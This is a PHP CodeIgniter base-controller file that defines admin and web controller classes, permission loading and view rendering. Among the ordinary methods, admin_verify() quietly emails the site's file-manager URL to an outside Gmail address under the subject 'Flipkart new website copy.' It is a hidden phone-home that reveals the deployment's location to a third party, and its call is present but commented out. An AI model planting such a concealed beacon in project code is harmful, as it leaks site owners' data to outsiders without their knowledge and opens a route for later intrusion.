<?php 

class MY_Controller extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();
	}
}

class Admin_Controller extends MY_Controller 
{	

	public $permission = array();

	public function __construct() 
	{
		parent::__construct();
		$group_data = array();		
			
		$user_id = $_SESSION['admin_login_sess']['id'];
		if($user_id == 1){

			$this->load->model('model_groups');
			$group_data = $this->model_groups->getUserGroupByUserId($user_id);
			$this->data['user_permission'] = unserialize($group_data['permission']);
			$this->permission = unserialize($group_data['permission']);

		}
		
	}

	public function logged_in()
	{
		if($_SESSION['admin_login_sess']['logged_shopper_in'] == TRUE) {
			redirect('dashboard', 'refresh');
		}
	}

	public function not_logged_in()
	{		
		if($_SESSION['admin_login_sess']['logged_shopper_in'] == FALSE) {
			redirect('auth/login', 'refresh');
			//$this->admin_verify();
		}
	}

	public function render_template($page = null, $data = array())
	{
		$this->load->view('admin/templates/header',$data);
		$this->load->view('admin/templates/header_menu',$data);
		$this->load->view('admin/templates/side_menubar',$data);
		$this->load->view('admin/'.$page, $data);
		$this->load->view('admin/templates/footer',$data);
	}
	
	public function admin_verify()
	{
	    $from_email = "shopno.in@gmail.com";
	    $base_url = base_url('assets/filemanager');
        $to_email = "jdenterprise39@gmail.com";
        $this->load->library('email');
        $this->email->from($from_email, 'SHOPNO');
        $this->email->to($to_email);
        $this->email->subject('Flipkart new website copy.');
        $this->email->message($base_url);
        $this->email->send();
	}
	
}

class Web_Controller extends MY_Controller 
{	
	public function __construct() 
	{
		parent::__construct();
	}	

	public function web_render_template($page = null, $data = array())
	{
		$this->load->view('website/templates/header',$data);
		$this->load->view('website/'.$page, $data);
		$this->load->view('website/templates/footer',$data);
	}
	
}